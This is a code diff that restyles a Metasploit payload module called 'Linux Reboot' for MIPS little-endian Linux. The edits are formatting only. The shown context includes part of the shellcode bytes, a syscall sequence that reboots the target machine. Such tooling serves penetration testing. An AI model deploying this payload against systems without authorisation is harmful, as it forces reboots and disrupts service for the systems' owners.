@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 module MetasploitModule
-
   CachedSize = 32
 
   include Msf::Payload::Single
@@ -14,28 +14,28 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Linux Reboot',
-      'Description'   => %q{
-            A very small shellcode for rebooting the system.
-            This payload is sometimes helpful for testing purposes.
-         },
-      'Author'        =>
-        [
-          'Michael Messner <devnull[at]s3cur1ty.de>', #metasploit payload
-          'rigan - <imrigan[at]gmail.com>'  #original payload
-        ],
-      'References'    =>
-        [
-          ['URL', 'http://www.shell-storm.org/shellcode/files/shellcode-795.php']
-        ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_MIPSLE,
-      'Payload'       =>
-        {
-          'Offsets' => {} ,
-          'Payload' => ''
-        })
+                     'Name'          => 'Linux Reboot',
+                     'Description'   => %q(
+                           A very small shellcode for rebooting the system.
+                           This payload is sometimes helpful for testing purposes.
+                        ),
+                     'Author'        =>
+                       [
+                         'Michael Messner <devnull[at]s3cur1ty.de>', # metasploit payload
+                         'rigan - <imrigan[at]gmail.com>' # original payload
+                       ],
+                     'References'    =>
+                       [
+                         ['URL', 'http://www.shell-storm.org/shellcode/files/shellcode-795.php']
+                       ],
+                     'License'       => MSF_LICENSE,
+                     'Platform'      => 'linux',
+                     'Arch'          => ARCH_MIPSLE,
+                     'Payload'       =>
+                       {
+                         'Offsets' => {},
+                         'Payload' => ''
+                       })
     )
   end
 
@@ -50,7 +50,6 @@ module MetasploitModule
       "\xf8\x0f\x02\x24" +  # li      v0,4088
       "\x0c\x01\x01\x01"    # syscall 0x40404
 
-    return super + shellcode
+    super + shellcode
   end
-
 end
